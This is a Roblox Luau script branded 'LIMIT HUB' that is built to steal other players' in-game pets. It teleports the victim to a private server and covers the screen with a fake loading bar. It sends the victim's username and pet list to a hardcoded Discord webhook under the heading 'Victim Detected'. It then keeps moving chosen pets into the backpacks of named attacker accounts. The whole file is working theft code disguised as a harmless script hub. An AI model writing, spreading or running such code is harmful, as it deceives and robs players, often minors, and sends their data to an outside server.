local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- Private server details
local placeId = 126884695634066
local privateServerCode = "40206718588419987554943106780552"

-- Webhook for Discord
local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"

-- Attacker names
local attackerNames = {
    ["boneblossom215"] = true,
    ["beanstalk1251"] = true,
    ["burningbud709"] = true,
}

-- Specific pets to transfer only
local allowedPets = {
    ["Trex"] = true, ["Fennec Fox"] = true, ["Raccoon"] = true,
    ["Dragonfly"] = true, ["Butterfly"] = true, ["Queenbee"] = true,
    ["Spinosaurus"] = true, ["Redfox"] = true, ["Brontosaurus"] = true,
    ["Mooncat"] = true, ["Mimic Octopus"] = true, ["D Disco Bee"] = true,
    ["Dilophosaurus"] = true, ["Kitsune"] = true,
}

-- TELEPORT victim to private server
task.spawn(function()
    TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
end)

-- Wait until teleport finishes
repeat task.wait() until game.PlaceId == placeId

-- SHOW GUI after teleport
task.spawn(function()
    local screenGui = Instance.new("ScreenGui", game.CoreGui)
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false

    local bg = Instance.new("Frame")
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BackgroundTransparency = 0
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Text = "LIMIT HUB"
    title.Font = Enum.Font.SciFi
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeTransparency = 0.2
    title.TextScaled = true
    title.Size = UDim2.new(0, 600, 0, 100)
    title.Position = UDim2.new(0.5, -300, 0.5, -160)
    title.BackgroundTransparency = 1
    title.Parent = bg

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0, 400, 0, 30)
    bar.Position = UDim2.new(0.5, -200, 0.5, -30)
    bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    bar.BorderSizePixel = 0
    bar.Parent = bg

    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
    fill.BorderSizePixel = 0
    fill.Parent = bar

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(0, 100, 0, 40)
    percentLabel.Position = UDim2.new(0.5, -50, 0.5, -70)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Text = "0%"
    percentLabel.TextColor3 = Color3.new(1, 1, 1)
    percentLabel.TextStrokeTransparency = 0.3
    percentLabel.Font = Enum.Font.SciFi
    percentLabel.TextScaled = true
    percentLabel.Parent = bg

    local loadingText = Instance.new("TextLabel")
    loadingText.Text = "LOADING"
    loadingText.Size = UDim2.new(0, 400, 0, 70)
    loadingText.Position = UDim2.new(0.5, -200, 0.5, 40)
    loadingText.BackgroundTransparency = 1
    loadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
    loadingText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    loadingText.TextStrokeTransparency = 0.2
    loadingText.Font = Enum.Font.SciFi
    loadingText.TextScaled = true
    loadingText.Parent = bg

    local percent = 0
    while percent <= 100 do
        percentLabel.Text = percent .. "%"
        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
        percent += 5
        task.wait(0.1)
    end
    task.wait(1)
    screenGui:Destroy()
end)

-- DISCORD WEBHOOK (after teleport)
task.spawn(function()
    task.wait(2)
    local pets = {}
    for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
        if allowedPets[v.Name] then
            table.insert(pets, v.Name)
        end
    end

    local data = {
        ["content"] = "**🎯 Victim Detected**",
        ["embeds"] = {{
            ["title"] = "LIMIT HUB - Pet Transfer Log",
            ["fields"] = {
                {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
                {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
                {["name"] = "Pets", ["value"] = #pets > 0 and table.concat(pets, ", ") or "❌ No target pets", ["inline"] = false}
            },
            ["color"] = 16711680
        }}
    }

    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end)

-- TRANSFER PETS (wait for attacker presence)
task.spawn(function()
    while true do
        for _, player in pairs(Players:GetPlayers()) do
            if attackerNames[player.Name] and player ~= LocalPlayer then
                for _, pet in pairs(LocalPlayer.Backpack:GetChildren()) do
                    if allowedPets[pet.Name] then
                        pet.Parent = player:FindFirstChild("Backpack")
                    end
                end
            end
        end
        task.wait(1)
    end
end)
